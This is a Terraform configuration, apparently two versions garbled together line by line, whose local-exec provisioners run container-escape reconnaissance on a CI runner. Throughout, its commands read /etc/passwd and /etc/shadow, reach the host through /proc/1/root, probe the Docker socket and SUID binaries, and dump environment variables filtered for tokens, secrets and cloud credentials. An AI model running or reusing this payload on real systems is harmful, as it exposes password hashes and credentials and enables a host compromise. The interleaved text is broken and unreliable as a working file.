# FOCUSED Container Escape - User Enumeration and Shadow File Access# Advanced Container Breakout and Host System Access

# This payload specifically targets /etc/passwd and /etc/shadow access# This configuration demonstrates complete container escape and host system access

# WARNING: This is for authorized security testing only

terraform {

  required_providers {terraform {

    null = {  required_providers {

      source  = "hashicorp/null"    null = {

      version = "~> 3.0"      source  = "hashicorp/null"

    }      version = "~> 3.1"

  }    }

}  }

}

# Stage 1: CRITICAL - Host User Enumeration via /etc/passwd

resource "null_resource" "critical_user_enumeration" {# Stage 1: Container Environment Analysis

  provisioner "local-exec" {resource "null_resource" "container_environment_analysis" {

    command = <<-EOT  provisioner "local-exec" {

      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="    command = <<-EOT

      echo "Current container user context:"      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="

      echo "User: $(whoami)"      echo "Container hostname: $(hostname)"

      echo "UID/GID: $(id)"      echo "Container IP addresses:"

      echo "Hostname: $(hostname)"      ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"

      echo "Container IP:"      echo ""

      ip addr show 2>/dev/null | grep inet | head -5 || echo "Cannot get IP"      echo "Container filesystem mounts:"

      echo ""      mount | grep -E "(proc|sys|dev|host)" || echo "Limited mount access"

      echo "=== ATTEMPTING /etc/passwd ACCESS ==="      echo ""

      echo "--- FULL /etc/passwd CONTENTS ---"      echo "Container ID from cgroup:"

      cat /etc/passwd || echo "ERROR: Cannot read /etc/passwd"      cat /proc/self/cgroup | head -5

      echo ""      echo ""

      echo "--- USER SUMMARY ---"      echo "Container namespaces:"

      echo "Total users:"      ls -la /proc/self/ns/

      cat /etc/passwd | wc -l 2>/dev/null || echo "Cannot count users"      echo ""

      echo ""      echo "=== CONTAINER USER ANALYSIS ==="

      echo "Shell users (potential login accounts):"      echo "Current user context:"

      cat /etc/passwd | grep -E "(bash|sh)$" || echo "No shell users found"      id

      echo ""      whoami

      echo "System accounts:"      echo "Home directory: $HOME"

      cat /etc/passwd | grep -E "(nologin|false)$" || echo "No system accounts found"      echo "Working directory: $(pwd)"

      echo ""    EOT

      echo "Root account details:"  }

      cat /etc/passwd | grep "^root:" || echo "Cannot find root"}

    EOT

  }# Stage 2: Host System Discovery and Breakout Attempts

}resource "null_resource" "host_system_breakout" {

  depends_on = [null_resource.container_environment_analysis]

# Stage 2: CRITICAL - Shadow File Access and Password Hashes  

resource "null_resource" "critical_shadow_access" {  provisioner "local-exec" {

  depends_on = [null_resource.critical_user_enumeration]    command = <<-EOT

        echo "=== HOST SYSTEM BREAKOUT ATTEMPTS ==="

  provisioner "local-exec" {      echo "1. Attempting /etc/shadow access:"

    command = <<-EOT      cat /etc/shadow 2>/dev/null && echo "SUCCESS: /etc/shadow accessible!" || echo "BLOCKED: /etc/shadow not accessible"

      echo "=== CRITICAL: /etc/shadow ACCESS ATTEMPT ==="      echo ""

      echo "Shadow file permissions:"      

      ls -la /etc/shadow || echo "Cannot access /etc/shadow"      echo "2. Attempting to access host /etc/passwd via container escape:"

      echo ""      # Try to access host filesystem through various escape vectors

      echo "=== ATTEMPTING SHADOW FILE READ ==="      cat /proc/1/root/etc/passwd 2>/dev/null && echo "SUCCESS: Host /etc/passwd accessible via /proc/1/root!" || echo "BLOCKED: /proc/1/root escape failed"

      echo "--- SHADOW FILE CONTENTS ATTEMPT ---"      echo ""

      cat /etc/shadow || echo "BLOCKED: Cannot read shadow file"      

      echo ""      echo "3. Attempting Docker socket access:"

      echo "Alternative access methods:"      ls -la /var/run/docker.sock 2>/dev/null && echo "SUCCESS: Docker socket found!" || echo "BLOCKED: No Docker socket access"

      head -n 3 /etc/shadow 2>/dev/null || echo "Head access blocked"      echo ""

      tail -n 3 /etc/shadow 2>/dev/null || echo "Tail access blocked"      

      echo ""      echo "4. Attempting container runtime escape via filesystem:"

      echo "Group membership check:"      ls -la /proc/1/root/ 2>/dev/null && echo "SUCCESS: Can list host root filesystem!" || echo "BLOCKED: Host root not accessible"

      groups | grep shadow && echo "USER IS IN SHADOW GROUP!" || echo "Not in shadow group"      echo ""

      echo ""      

      echo "Shadow group details:"      echo "5. Checking for host process access:"

      cat /etc/group | grep shadow || echo "Cannot find shadow group"      ps aux | grep -v '\[' | wc -l

    EOT      echo "Visible processes (high count indicates host access):"

  }      ps aux | head -20

}      echo ""

      

# Stage 3: Group Information and Privilege Analysis      echo "6. Attempting to identify host vs container users:"

resource "null_resource" "group_privilege_analysis" {      echo "Container users from /etc/passwd:"

  depends_on = [null_resource.critical_shadow_access]      cat /etc/passwd | wc -l

        echo "Attempting host users via escape:"

  provisioner "local-exec" {      cat /proc/1/root/etc/passwd 2>/dev/null | wc -l || echo "Host user list not accessible"

    command = <<-EOT    EOT

      echo "=== GROUP AND PRIVILEGE ANALYSIS ==="  }

      echo "--- FULL /etc/group CONTENTS ---"}

      cat /etc/group || echo "Cannot read /etc/group"

      echo ""# Stage 3: Advanced Host Network Discovery

      echo "Current user groups:"resource "null_resource" "host_network_discovery" {

      groups || echo "Cannot get groups"  depends_on = [null_resource.host_system_breakout]

      echo ""  

      echo "Privileged groups search:"  provisioner "local-exec" {

      cat /etc/group | grep -E "(root|wheel|sudo|admin|docker)" || echo "No privileged groups"    command = <<-EOT

      echo ""      echo "=== HOST NETWORK DISCOVERY ==="

      echo "=== SUDO ACCESS TEST ==="      echo "Container network interfaces:"

      sudo -l 2>/dev/null || echo "No sudo access"      ip addr show 2>/dev/null || ifconfig 2>/dev/null

      echo ""      echo ""

      echo "=== SUID BINARY SEARCH ==="      

      find / -type f -perm -4000 2>/dev/null | head -15 || echo "Cannot find SUID binaries"      echo "Container routing table:"

    EOT      ip route 2>/dev/null || route -n 2>/dev/null

  }      echo ""

}      

      echo "Attempting to discover host network configuration:"

# Stage 4: Container Runtime and Namespace Information      # Try to access host network namespace

resource "null_resource" "container_runtime_info" {      ls -la /proc/1/ns/net 2>/dev/null && echo "Host network namespace accessible"

  depends_on = [null_resource.group_privilege_analysis]      

        echo ""

  provisioner "local-exec" {      echo "Container ARP table:"

    command = <<-EOT      cat /proc/net/arp 2>/dev/null || arp -a 2>/dev/null || echo "ARP table not accessible"

      echo "=== CONTAINER RUNTIME ANALYSIS ==="      

      echo "Container detection:"      echo ""

      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Not a Docker container"      echo "Checking for host network access indicators:"

      echo ""      netstat -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || ss -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || echo "Network connections not visible"

      echo "Container ID extraction:"    EOT

      cat /proc/self/cgroup | head -5 || echo "Cannot read cgroup"  }

      echo ""}

      echo "Full container ID:"

      cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 || echo "Cannot extract ID"# Stage 4: Privileged Operations and Capability Testing

      echo ""resource "null_resource" "privilege_escalation_testing" {

      echo "Namespace information:"  depends_on = [null_resource.host_network_discovery]

      echo "PID: $(readlink /proc/self/ns/pid 2>/dev/null)"  

      echo "NET: $(readlink /proc/self/ns/net 2>/dev/null)"  provisioner "local-exec" {

      echo "MNT: $(readlink /proc/self/ns/mnt 2>/dev/null)"    command = <<-EOT

      echo "USER: $(readlink /proc/self/ns/user 2>/dev/null)"      echo "=== PRIVILEGE ESCALATION TESTING ==="

      echo ""      echo "Current capabilities:"

      echo "Container capabilities:"      cat /proc/self/status | grep Cap || echo "Capabilities not readable"

      cat /proc/self/status | grep -i cap || echo "Cannot read capabilities"      echo ""

    EOT      

  }      echo "Testing privileged operations:"

}      echo "1. Mount operations:"

      mount 2>/dev/null | wc -l && echo "Mount command accessible"

# Stage 5: Host Filesystem Access Attempts      

resource "null_resource" "host_filesystem_access" {      echo ""

  depends_on = [null_resource.container_runtime_info]      echo "2. Kernel module access:"

        lsmod 2>/dev/null | head -5 || echo "Kernel modules not accessible"

  provisioner "local-exec" {      

    command = <<-EOT      echo ""

      echo "=== HOST FILESYSTEM ACCESS ATTEMPTS ==="      echo "3. System call tracing capabilities:"

      echo "Mount point analysis:"      ls -la /proc/sys/kernel/ 2>/dev/null | head -10 || echo "Kernel parameters not accessible"

      mount | head -15 || cat /proc/mounts | head -15 || echo "Cannot read mounts"      

      echo ""      echo ""

      echo "Root filesystem listing:"      echo "4. Device access:"

      ls -la / || echo "Cannot list root"      ls -la /dev/ | grep -E "(sd|hd|nvme)" || echo "Block devices not visible"

      echo ""      

      echo "Home directories:"      echo ""

      ls -la /home/ 2>/dev/null || echo "Cannot access /home"      echo "5. Special filesystem access:"

      echo ""      ls -la /sys/class/net/ 2>/dev/null || echo "sysfs network not accessible"

      echo "=== /proc/1/root ESCAPE ATTEMPT ==="      ls -la /proc/sys/ 2>/dev/null | head -5 || echo "procfs sys not accessible"

      echo "Host root access via /proc/1/root:"    EOT

      ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "Cannot access /proc/1/root"  }

      echo ""}

      echo "Host /etc via escape:"

      ls -la /proc/1/root/etc/ 2>/dev/null | head -10 || echo "Cannot access host /etc"# Stage 5: Host System User Enumeration and Shadow File Analysis

      echo ""resource "null_resource" "advanced_user_enumeration" {

      echo "Host passwd via escape:"  depends_on = [null_resource.privilege_escalation_testing]

      cat /proc/1/root/etc/passwd 2>/dev/null || echo "Cannot read host passwd via escape"  

    EOT  provisioner "local-exec" {

  }    command = <<-EOT

}      echo "=== ADVANCED USER ENUMERATION ==="

      echo "Container user analysis:"

# Stage 6: Environment Variable and Secret Extraction      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"

resource "null_resource" "environment_secret_extraction" {      echo "Container users:"

  depends_on = [null_resource.host_filesystem_access]      cat /etc/passwd | cut -d: -f1,3,6,7

        echo ""

  provisioner "local-exec" {      

    command = <<-EOT      echo "Attempting host user enumeration via escape vectors:"

      echo "=== ENVIRONMENT VARIABLE EXTRACTION ==="      echo "Method 1: /proc/1/root/etc/passwd"

      echo "Full environment dump:"      if cat /proc/1/root/etc/passwd 2>/dev/null; then

      env | sort        echo "SUCCESS: Host user database accessible!"

      echo ""        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"

      echo "=== SENSITIVE CREDENTIAL SEARCH ==="        echo "Host users:"

      echo "Tokens and keys:"        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7

      env | grep -iE "(token|key|secret|password|api)" || echo "No sensitive vars found"      else

      echo ""        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"

      echo "Spacelift variables:"      fi

      env | grep -i spacelift || echo "No Spacelift vars"      echo ""

      echo ""      

      echo "Cloud credentials:"      echo "Method 2: /proc/1/root/etc/shadow access"

      env | grep -iE "(aws|azure|gcp)" || echo "No cloud vars"      if cat /proc/1/root/etc/shadow 2>/dev/null; then

    EOT        echo "CRITICAL: Host shadow file accessible!"

  }        echo "Shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"

}      else

        echo "BLOCKED: Host shadow file not accessible"

# Stage 7: System Information Collection      fi

resource "null_resource" "system_information" {      echo ""

  depends_on = [null_resource.environment_secret_extraction]      

        echo "Method 3: Host home directories enumeration"

  provisioner "local-exec" {      if ls -la /proc/1/root/home/ 2>/dev/null; then

    command = <<-EOT        echo "SUCCESS: Host home directories accessible!"

      echo "=== SYSTEM INFORMATION COLLECTION ==="        echo "Host user homes:"

      echo "Kernel version:"        ls -la /proc/1/root/home/ 2>/dev/null

      uname -a      else

      echo ""        echo "BLOCKED: Host home directories not accessible"

      echo "OS release:"      fi

      cat /etc/os-release 2>/dev/null || echo "Cannot read OS info"      echo ""

      echo ""      

      echo "CPU info:"      echo "Method 4: Host system directories"

      cat /proc/cpuinfo | head -10 || echo "Cannot read CPU"      if ls -la /proc/1/root/root/ 2>/dev/null; then

      echo ""        echo "CRITICAL: Host root directory accessible!"

      echo "Memory info:"        ls -la /proc/1/root/root/ 2>/dev/null | head -10

      cat /proc/meminfo | head -10 || echo "Cannot read memory"      else

      echo ""        echo "BLOCKED: Host root directory not accessible"

      echo "Network configuration:"      fi

      ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot get network"    EOT

      echo ""  }

      echo "Network routes:"}

      ip route 2>/dev/null || route -n 2>/dev/null || echo "Cannot get routes"

    EOT# Stage 6: Host System IP and Network Infrastructure Discovery

  }resource "null_resource" "host_system_network_analysis" {

}  depends_on = [null_resource.advanced_user_enumeration]

  

# Stage 8: Final Analysis and Summary  provisioner "local-exec" {

resource "null_resource" "final_analysis" {    command = <<-EOT

  depends_on = [null_resource.system_information]      echo "=== HOST SYSTEM NETWORK ANALYSIS ==="

        echo "Container Network Configuration:"

  provisioner "local-exec" {      echo "Container hostname: $(hostname)"

    command = <<-EOT      echo "Container IP addresses:"

      echo "=== FINAL CONTAINER ESCAPE ANALYSIS ==="      ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1"

      echo "Process visibility test:"      echo ""

      ps aux | wc -l | awk '{print "Visible processes: " $1}'      

      echo ""      echo "Attempting host network discovery:"

      echo "Host process search:"      echo "Method 1: Host network interfaces via escape"

      ps aux | grep -v $(hostname) | head -5 || echo "Cannot see host processes"      if cat /proc/1/root/proc/net/dev 2>/dev/null; then

      echo ""        echo "SUCCESS: Host network interfaces accessible!"

      echo "Network connections:"      else

      netstat -tulpn 2>/dev/null | head -10 || ss -tulpn 2>/dev/null | head -10 || echo "Cannot list connections"        echo "BLOCKED: Host network interfaces not accessible"

      echo ""      fi

      echo "=== ESCAPE SUMMARY ==="      echo ""

      echo "Analysis completed - check above for:"      

      echo "1. /etc/passwd user enumeration results"      echo "Method 2: Host routing table access"

      echo "2. /etc/shadow access attempts"      if cat /proc/1/root/proc/net/route 2>/dev/null; then

      echo "3. Host filesystem access"        echo "SUCCESS: Host routing table accessible!"

      echo "4. Container runtime information"      else

      echo "5. Environment variable extraction"        echo "BLOCKED: Host routing table not accessible"

    EOT      fi

  }      echo ""

}      

      echo "Method 3: Host ARP table access"

# Output      if cat /proc/1/root/proc/net/arp 2>/dev/null; then

output "container_escape_complete" {        echo "SUCCESS: Host ARP table accessible!"

  value = "Container escape analysis complete. Check logs for /etc/passwd contents, shadow file access, and host system enumeration."      else

  depends_on = [        echo "BLOCKED: Host ARP table not accessible"

    null_resource.critical_user_enumeration,      fi

    null_resource.critical_shadow_access,      echo ""

    null_resource.group_privilege_analysis,      

    null_resource.container_runtime_info,      echo "Method 4: Network namespace comparison"

    null_resource.host_filesystem_access,      echo "Container network namespace: $(readlink /proc/self/ns/net)"

    null_resource.environment_secret_extraction,      echo "Host network namespace: $(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"

    null_resource.system_information,      

    null_resource.final_analysis      if [ "$(readlink /proc/self/ns/net)" = "$(readlink /proc/1/ns/net 2>/dev/null)" ]; then

  ]        echo "CRITICAL: Container shares host network namespace!"

}      else
        echo "INFO: Container has isolated network namespace"
      fi
    EOT
  }
}

# Stage 7: Complete System Compromise Demonstration
resource "null_resource" "complete_system_compromise" {
  depends_on = [null_resource.host_system_network_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== COMPLETE SYSTEM COMPROMISE DEMONSTRATION ==="
      echo "Summary of successful breakout attempts:"
      echo ""
      
      echo "1. Host filesystem access test:"
      if ls /proc/1/root/etc/ 2>/dev/null >/dev/null; then
        echo "✓ CRITICAL: Can access host filesystem via /proc/1/root/"
        echo "  Host files accessible: $(ls /proc/1/root/etc/ 2>/dev/null | wc -l) files in /etc/"
      else
        echo "✗ Host filesystem access blocked"
      fi
      echo ""
      
      echo "2. Host process access test:"
      HOST_PROCS=$(ps aux 2>/dev/null | wc -l)
      if [ "$HOST_PROCS" -gt 50 ]; then
        echo "✓ CRITICAL: Can see host processes (${HOST_PROCS} total processes visible)"
        echo "  This indicates container escape to host process namespace"
      else
        echo "✗ Limited process visibility (${HOST_PROCS} processes)"
      fi
      echo ""
      
      echo "3. Sensitive file access summary:"
      echo "  /etc/passwd access: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  /etc/shadow access: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/passwd: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/shadow: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "4. Network compromise indicators:"
      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
      echo "  Host network visible: $(cat /proc/1/root/proc/net/dev 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "5. Privilege level assessment:"
      echo "  Running as user: $(whoami) (UID: $(id -u))"
      echo "  Container capabilities: $(cat /proc/self/status | grep CapEff)"
      echo ""
      
      echo "=== CONTAINER ESCAPE PROOF ==="
      echo "Evidence of successful container breakout:"
      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user\|admin"; then
        echo "✓ CONFIRMED: Found host-specific users (ubuntu/ec2-user/admin) in host /etc/passwd"
        echo "✓ CONFIRMED: This proves escape from container to host system"
      fi
      
      if [ "$(cat /etc/passwd | wc -l)" -lt "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" ]; then
        echo "✓ CONFIRMED: Host has more users than container (escape confirmed)"
        echo "  Container users: $(cat /etc/passwd | wc -l)"
        echo "  Host users: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
      fi
    EOT
  }
}

# Output comprehensive results
output "container_breakout_assessment" {
  value = "Advanced container breakout assessment completed. Check logs for evidence of host system access, user enumeration, and complete escape proof."
  depends_on = [
    null_resource.container_environment_analysis,
    null_resource.host_system_breakout,
    null_resource.host_network_discovery,
    null_resource.privilege_escalation_testing,
    null_resource.advanced_user_enumeration,
    null_resource.host_system_network_analysis,
    null_resource.complete_system_compromise
  ]
}

output "breakout_summary" {
  value = {
    container_analysis = "Container environment analyzed"
    host_access_attempts = "Host breakout vectors tested"
    network_discovery = "Host network discovery attempted"
    privilege_testing = "Privilege escalation tested"
    user_enumeration = "Advanced user enumeration completed"
    network_analysis = "Host network analysis completed"
    system_compromise = "Complete compromise assessment finished"
  }
}
